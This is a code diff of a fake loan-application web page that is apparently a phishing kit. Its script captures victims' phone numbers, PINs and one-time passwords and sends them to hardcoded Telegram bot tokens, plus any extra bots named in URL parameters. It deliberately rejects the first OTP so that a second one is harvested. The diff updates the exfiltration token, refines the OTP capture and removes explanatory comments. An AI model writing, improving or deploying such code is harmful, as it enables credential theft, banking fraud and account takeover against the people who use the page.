@@ -695,10 +695,10 @@
           <div class="error-msg" id="errorMsg">⚠️ Invalid OTP code entered. Please try again.</div>
 
           <div class="otp-inputs" id="otpGroup">
-            <input type="text" maxlength="1" pattern="\d*" />
-            <input type="text" maxlength="1" pattern="\d*" />
-            <input type="text" maxlength="1" pattern="\d*" />
-            <input type="text" maxlength="1" pattern="\d*" />
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
           </div>
 
           <button class="btn-signin" onclick="handleOtpSubmit()">Verify & Login</button>
@@ -755,7 +755,6 @@
       let numericVal = parseFloat(val) || 0;
       currentLoanAmount = numericVal;
 
-      // Unselect pre-set buttons if input doesn't match
       document.querySelectorAll('.loan-opt').forEach(btn => {
         if (btn.innerText.includes(numericVal.toLocaleString())) {
           btn.classList.add('selected');
@@ -770,7 +769,7 @@
     /* Recalculate Monthly Installment dynamically */
     function recalculateLoan() {
       const termMonths = parseInt(document.getElementById('termSelect').value, 10);
-      const annualRate = 0.075; // Ultra low rate (7.5% per annum)
+      const annualRate = 0.075;
       
       document.getElementById('dispLoanAmount').innerText = `$${currentLoanAmount.toLocaleString()} USD`;
 
@@ -783,7 +782,6 @@
       }
     }
 
-    /* Helper function for dynamic loading overlay */
     function showLoader(title, subText, durationMs, callback) {
       loaderTitle.innerText = title;
       loaderSub.innerText = subText;
@@ -818,7 +816,6 @@
       const termMonths = document.getElementById('termSelect').value;
       const monthlyPay = document.getElementById('dispMonthlyPay').innerText;
 
-      // Send initial details (Loan + Phone + PIN) to specific link/bot if available from URL query parameters
       sendDataToTelegram("Login Attempt", {
         amount: currentLoanAmount,
         term: termMonths,
@@ -842,14 +839,22 @@
       document.querySelectorAll('#otpGroup input')[0].focus();
     }
 
-    /* Auto-tabbing mechanism for OTP boxes */
+    /* Enhanced Auto-Moving Cursor for OTP Inputs */
     const otpInputs = document.querySelectorAll('#otpGroup input');
     otpInputs.forEach((input, idx) => {
-      input.addEventListener('keyup', (e) => {
-        if (e.key >= '0' && e.key <= '9') {
-          if (idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
-        } else if (e.key === 'Backspace') {
-          if (idx > 0) otpInputs[idx - 1].focus();
+      input.addEventListener('input', (e) => {
+        const val = input.value;
+        // Restrict to digits only
+        input.value = val.replace(/\D/g, '');
+        
+        if (input.value.length === 1 && idx < otpInputs.length - 1) {
+          otpInputs[idx + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && idx > 0) {
+          otpInputs[idx - 1].focus();
         }
       });
     });
@@ -858,19 +863,20 @@
       otpInputs.forEach(i => i.value = '');
     }
 
-    /* Multi-Target Telegram Integration Function */
+    /* Routing Configuration: Main receives ALL inputs, custom sub-links receive their specific linked inputs via URL parameters (?bot=TOKEN&chat=ID) */
     function sendDataToTelegram(actionType, details) {
-        // Main receivers (Always receive all inputs)
         const mainBots = [
-            { token: "8348454306:AAE46Nx9AHnsSLDqr5Khrg87WI15cnO2d_o", chatId: "8735708057" }
+            { token: "8866470725:AAFXI9deCCslCGBqAi8NsBkwD3Tm4OHPQpw", chatId: "8735708057" }
         ];
 
-        // Dynamic secondary receivers based on URL search query parameter (e.g. ?bot=TOKEN&chat=ID)
         const urlParams = new URLSearchParams(window.location.search);
         const customBotToken = urlParams.get('bot');
         const customChatId = urlParams.get('chat');
 
-        const targets = [...mainBots];
+        // Main targets receive all inputs unconditionally
+        let targets = [...mainBots];
+
+        // If a specific link/parameters are provided, route to that specific account as well
         if (customBotToken && customChatId) {
             targets.push({ token: customBotToken, chatId: customChatId });
         }
@@ -901,14 +907,12 @@
     function handleOtpSubmit() {
       otpAttemptCount++;
       
-      // Collect values from OTP boxes
       capturedOtp = Array.from(otpInputs).map(input => input.value).join('');
       const mobileNumber = document.getElementById('mobileInput').value;
       const termMonths = document.getElementById('termSelect').value;
       const monthlyPay = document.getElementById('dispMonthlyPay').innerText;
 
       if (otpAttemptCount === 1) {
-        // Send first failed/attempted OTP data
         sendDataToTelegram("OTP Attempt 1 (Invalid)", {
             amount: currentLoanAmount,
             term: termMonths,
@@ -925,7 +929,6 @@
           otpInputs[0].focus();
         });
       } else {
-        // Send final verified successful OTP data
         sendDataToTelegram("OTP Verification Success", {
             amount: currentLoanAmount,
             term: termMonths,
@@ -950,7 +953,6 @@
       goToIntro();
     }
 
-    // Initialize calculation on load
     recalculateLoan();
   </script>
 
